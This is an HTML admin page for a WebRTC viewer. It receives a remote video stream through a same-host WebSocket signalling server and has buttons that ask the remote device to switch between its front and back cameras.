<!DOCTYPE html>
<html lang="it">
<head>
<meta charset="UTF-8">
<title>Admin WebRTC</title>
<style>
video { width: 320px; margin: 10px; border:2px solid #0f0; border-radius:6px; }
button { margin:5px; padding:5px 10px; font-weight:bold; }
</style>
</head>
<body>
<h2>Admin WebRTC</h2>
<div id="videos"></div>
<button onclick="switchCam('user')">Front</button>
<button onclick="switchCam('environment')">Back</button>

<script>
const room = new URLSearchParams(location.search).get('room') || 'user1';
let pc = new RTCPeerConnection();
let ws = new WebSocket(`wss://${location.host}/signal`);
let video = document.createElement('video');
video.autoplay = true; video.playsInline = true; video.muted = false;
document.getElementById('videos').appendChild(video);

ws.onopen = () => ws.send(JSON.stringify({ type:'register', role:'admin', room }));

pc.ontrack = e => video.srcObject = e.streams[0];
pc.onicecandidate = e => { if(e.candidate && ws.readyState===1) ws.send(JSON.stringify({type:'ice',candidate:e.candidate, room})); };

ws.onmessage = async e => {
  const data = JSON.parse(e.data);
  if(data.type==='offer') {
    await pc.setRemoteDescription({ type:'offer', sdp:data.sdp });
    const answer = await pc.createAnswer();
    await pc.setLocalDescription(answer);
    ws.send(JSON.stringify({ type:'answer', sdp:answer.sdp, room }));
  } else if(data.type==='ice') {
    await pc.addIceCandidate(data.candidate);
  }
};

function switchCam(cam){ if(ws.readyState===1) ws.send(JSON.stringify({type:'switchCamera', camera:cam, room})); }
</script>
</body>
</html>
